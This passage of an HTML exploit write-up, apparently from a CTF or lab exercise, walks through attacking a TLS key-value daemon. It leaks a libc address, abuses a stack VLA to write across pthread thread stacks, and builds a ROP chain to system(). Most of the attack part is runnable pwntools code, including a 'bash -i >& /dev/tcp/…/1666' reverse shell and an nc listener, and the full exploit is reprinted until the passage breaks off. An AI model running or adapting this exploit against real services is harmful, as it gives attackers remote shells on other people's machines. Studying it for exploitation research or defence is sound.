+  <code>b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd9\x02\x00\x00@\x96v\xb7@\x96v\xb7\xf0\xa2\x04\xb9\xf0\xa2\x04\xb9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'</code></li>
+<li>it just so happens that that random data between the a's is an address in libc , and further more it sits at  a fixed position from the program's .text section and <strong>THE STACKS OF THE THREADS</strong> , while the actual program stack has its own randomized stack , the stacks of threads are in the same space as shared libraries and thus sit at a fixed offset from the shared libraries , whose addresses we just leaked .</li>
+<li>now we have the base address of all libraries, most importantly <code>libc</code> so we can call any libc function  . plus a way to write to the stacks of a thread <strong>AND</strong> know the exact address of what we have written , so we can later put commands and pass their addresses as arguments to <code>system</code>.</li>
+</ul>
+<h1>the stack VLA</h1>
+<h2>pthread multithreaded memory layout</h2>
+<ul>
+<li>to be concise , the stacks of threads are allocated contiguously and are separated by what's known as <code>guard pages</code> , which are - 0x1000 (4096) bytes memory buffers that are now readable/writeable or executable , and any attempt to do so will end with a segfault </li>
+<li><code>guard page</code> would have been a problem if this was some kind of gigantic overflow , but what we will do will allow us  precise write access without overwriting the memory leading to where we wanna write , unlike classic overflows .</li>
+<li>this is how the memory of a multithreaded program that uses pthreads looks :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>    MULTITHREADED MEMORY LAYOUT
+===========================
+HIGH: 0xffffffff
+┌────────────────────────┐
+│       KERNEL           │
+├────────────────────────┤
+│   MAIN THREAD STACK    │
+├────────────────────────┤
+│                        │
+│    THREAD STACKS       │
+│                        │
+│ 0xb7585000 ┌─────────┐ │
+│            │THREAD 2 │ │
+│ 0xb6d85000 ├─────────┤ │  
+│            │▒▒GUARD▒▒│ │
+│ 0xb6d84000 ├─────────┤ │
+│            │THREAD 1 │ │
+│ 0xb6584000 ├─────────┤ │
+│            │▒▒GUARD▒▒│ │
+│ 0xb6583000 ├─────────┤ │
+│            │THREAD 0 │ │
+│ 0xb5d83000 └─────────┘ │
+│   ▒ = 4KB Guard Page   │
+├────────────────────────┤
+│         HEAP           │
+├────────────────────────┤
+│      LIBRARIES         │
+├────────────────────────┤
+│       BINARY           │
+└────────────────────────┘
+LOW: 0x00000000
+
+STACK GROWTH:
+Thread 2: 0xb7585000↓0xb6d85000
+Thread 1: 0xb6d84000↓0xb6584000  
+Thread 0: 0xb6583000↓0xb5d83000
+</code></pre></div>
+
+<ul>
+<li>now because for example I control the buffer size in thread 2 , I can make so big (more than 8mb ) and the bottom of the buffer (where I can write upwards) will be located in the stack of the thread 1 , so if my buffer size is so big , I can write anywhere in any memory lower than thread 2 without touching  guard pages ! , an by manipulating the size allocated , I can choose precisely where I write , there a small catch which is that the size will be padded to be 16 byte aligned , so you can only $begin$ writing in an address that's 16 bytes aligned.</li>
+<li>an issue here is that when we allocate the gigantic array , the stack frames of the functions called by <code>gather_data</code> of the attacker thread need to be $below$ that array , and if we don't make space for them they corrupt the stack frames of the victim threads's functions , essantially an issue of two threads using the same memory region as their stack</li>
+<li>found the key insight to bypass the issue  : so you can modify the stack of a thread from another using the top one , without the stack frame of the latter fucking up everything , create space with the <code>gather data</code> VLA trick in the victim thread itself and let the stacks of the modifier be there while modifying <code>gathe_data</code> frame and not affecting what's down the stack; never mind what you've just read I was sleepy and motivated .</li>
+<li>we need roughly 600 bytes to contain the stack frames of the attacker thread, calculated it by substracting the last frame's esp from <code>gather_data</code>'s in the said thread in gdb.</li>
+<li>now the idea is to create space for the stack frames of the attacker thread's functions in the victim thread's stack using the VLA trick , we now have a complete execution redirection primitive , but we do need a leak for that to be useful.(which we have)</li>
+</ul>
+<h2>The Exploit</h2>
+<ul>
+<li>as I said , i have made some function to facilitate making a gnutls connection to the target and perform key operations like set and update programatically  here they are , DISCLAIMER : BAD CODE AHEAD :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;critical&#39;</span>
+
+<span class="n">serverip</span> <span class="o">=</span> <span class="s1">&#39;redacted&#39;</span>
+<span class="n">my_local_ip</span> <span class="o">=</span> <span class="s1">&#39;redacted&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">20006</span>
+<span class="n">VLA_offset</span> <span class="o">=</span> <span class="mi">8390000</span> <span class="o">+</span> <span class="mi">3204</span> <span class="o">-</span> <span class="mi">560</span>
+<span class="n">libcelf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">):</span>
+    <span class="k">try</span> <span class="p">:</span> 
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;gnutls-cli&#39;</span><span class="p">,</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="p">,</span> <span class="n">serverip</span><span class="p">,</span><span class="s1">&#39;--insecure&#39;</span><span class="p">])</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;// Welcome to KeyValDaemon. Type &#39;h&#39; for help information&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">p</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span> <span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;couldn&#39;t connect , a crash ?</span><span class="se">\n\n</span><span class="s2"> here is the error :</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">()</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">set_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">lenght</span><span class="p">,</span><span class="n">strtosend</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;s &#39;</span><span class="o">+</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lenght</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">strtosend</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">update_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">lenght</span><span class="p">,</span><span class="n">strtosend</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;u &#39;</span><span class="o">+</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lenght</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">strtosend</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;successfully&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;updated variable successfully</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<ul>
+<li>you can also see in the code above that i have set the elfs of libc (downloaded from the vm) for facility calculating offsets , and the VLA offset I calculated by examining memory in <code>gdb</code>. </li>
+<li>now  we are going to leak leak the address of libc using the leak primitive we got earlier :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="c1"># leaking libc</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">k</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+
+<span class="n">set_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;u A 1500</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="mi">1450</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">k</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;u A 1400</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="mi">49</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;added!&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;g A</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;// Sending 1500 bytes</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libcleak</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libcleak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">libcleak</span><span class="p">[</span><span class="mi">1412</span><span class="p">:</span><span class="mi">1416</span><span class="p">])</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">libcleak</span>  <span class="o">-</span> <span class="mi">1545776</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">&amp;</span> <span class="mh">0xfffff000</span>
+<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">k</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+
+<ul>
+<li>this code does the exact same operation we talked about in the leak section </li>
+<li>after that , we set the base address for the <code>libc</code> elf variable and use it to calculate other addresses , thanks to <code>pwntools</code> :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="c1">#setting up addresses</span>
+<span class="n">libcelf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_addr</span>
+<span class="n">system_libc_addr</span> <span class="o">=</span> <span class="n">libcelf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">exit_libc_addr</span> <span class="o">=</span> <span class="n">libcelf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]</span>
+<span class="n">twopopret_gad</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x000a7a5a</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[LEAKED LIBC ADDR : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<h4>injecting a reverse shell command</h4>
+<ul>
+<li>even though we have an execution primitive now and a leak ,to get our shell we can't just do <code>system("/bin/sh")</code> , bcs there's a tls connection between us and the server , my solution was to put a reverse shell command string in the stack of a thread by setting a key and passing the reverse shell command to it as data for the key , if you remember dear reader , <code>gather_data</code> function that is used in the set key functionality allocates a buffer and puts the data in it before copying to a <code>data-&gt;data</code> field in a  <code>data</code> data structure, that's how our input reaches the stack .</li>
+<li>you may also ask how do I know the address in the stack of the input I'm going to send  , i can do that thanks to the fact that the stack of a thread , unlike the main stack of the process , is at a fixed position from <code>libc</code> and other shared libraries , thanks to the fact that the stacks of the threads are <code>mmap</code>ed just like shared libraries , and while the base of <code>mmap</code> is randomized with <code>ASLR</code> , if we leak just one address of a <code>mmaped</code> memory location , we can know the addresses of every other memory gotten with <code>mmap</code> , for further details see <a href="aslr.html">ASLR</a> , the main point here is that i could determine the address of our command in the stack just by calculating its offset from <code>libc</code> in gdb and adding that offset to the <code>libc</code> address we leak. </li>
+<li>then we pass the address of the command to system , the command is this :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/<span class="s1">&#39;+my_local_ip.encode()+b&#39;</span>/1666<span class="s1">&#39;+b&#39;</span><span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+
+<ul>
+<li>and it tells the vm to execute a shell , connect to my machine at port 1666 and forward the input and output file descriptors of the shell to the connection.</li>
+</ul>
+<h4>control flow redirection</h4>
+<ul>
+<li>what remains now is the actual control flow redirection which I'll do with a <code>ROP</code> chain thanks to the addresses i got from the <code>libc</code> leak , in the following code , after placing my command in the stack of thread <code>l</code> and making the <code>ROP</code> chain , I have opened two threads <code>k</code> and <code>p</code> , while <code>k</code> is waiting for an update operation to be completed , we use the stack overrun vulnerability to write our <code>ROP</code> chain to <code>k</code>'s stack , and then sent to <code>k</code> the data it is waiting for and make it return to our <code>ROP</code> chain , which gives us a sweet shell on port 1666.</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="n">p</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">k</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">l</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+
+
+<span class="c1">#starting a process that listen on port 1666 for the shell</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[LISTENING FOR SHELL]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">processarr</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;-v&#39;</span><span class="p">,</span><span class="s2">&quot;-lp&quot;</span> <span class="p">,</span><span class="s1">&#39;1666&#39;</span><span class="p">]</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">processarr</span><span class="p">)</span>
+
+<span class="c1">#putting the reverse shell command in a thread&#39;s stack</span>
+<span class="n">reverse_shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/&#39;</span><span class="o">+</span><span class="n">my_local_ip</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/1666&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &lt;&amp;1</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">set_key</span><span class="p">(</span><span class="n">l</span><span class="p">,</span><span class="s1">&#39;revshell&#39;</span><span class="p">,</span><span class="mi">85535</span><span class="p">,</span><span class="n">reverse_shell</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="mi">65535</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="c1">#calculated at runtime with gdb , constant across runs</span>
+<span class="n">reverse_shell_libc_offset</span> <span class="o">=</span> <span class="mi">34413856</span>
+<span class="n">reverse_shell_str_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="n">reverse_shell_libc_offset</span>
+
+<span class="c1">#spawning a shell with ROP</span>
+<span class="n">rop_chain_shell</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_libc_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">exit_libc_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">reverse_shell_str_addr</span><span class="p">)</span>
+<span class="n">k</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;s g 2000&#39;</span><span class="p">)</span>
+<span class="n">set_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="n">VLA_offset</span><span class="p">,</span><span class="mi">12</span><span class="o">*</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">rop_chain_shell</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">k</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="mi">2000</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">testshell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
+<span class="c1">#fallback</span>
+<span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+
+<h4>the complete exploit</h4>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;critical&#39;</span>
+
+<span class="n">serverip</span> <span class="o">=</span> <span class="s1">&#39;redacted&#39;</span>
+<span class="n">my_local_ip</span> <span class="o">=</span> <span class="s1">&#39;redacted&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">20006</span>
+<span class="n">VLA_offset</span> <span class="o">=</span> <span class="mi">8390000</span> <span class="o">+</span> <span class="mi">3204</span> <span class="o">-</span> <span class="mi">560</span>
+<span class="n">libcelf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">testshell</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+    <span class="c1">#flush</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;echo congratz?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+    <span class="k">if</span>  <span class="sa">b</span><span class="s1">&#39;congratz?&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">congratz!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kc">False</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">):</span>
+    <span class="k">try</span> <span class="p">:</span> 
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;gnutls-cli&#39;</span><span class="p">,</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="p">,</span> <span class="n">serverip</span><span class="p">,</span><span class="s1">&#39;--insecure&#39;</span><span class="p">])</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;// Welcome to KeyValDaemon. Type &#39;h&#39; for help information&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">p</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span> <span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;couldn&#39;t connect , a crash ?</span><span class="se">\n\n</span><span class="s2"> here is the error :</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">()</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">set_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">lenght</span><span class="p">,</span><span class="n">strtosend</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;s &#39;</span><span class="o">+</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lenght</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">strtosend</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">update_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">lenght</span><span class="p">,</span><span class="n">strtosend</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;u &#39;</span><span class="o">+</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lenght</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">strtosend</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;successfully&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;updated variable successfully</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+
+<span class="c1"># leaking libc</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">k</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+
+<span class="n">set_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;u A 1500</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="mi">1450</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">k</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;u A 1400</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
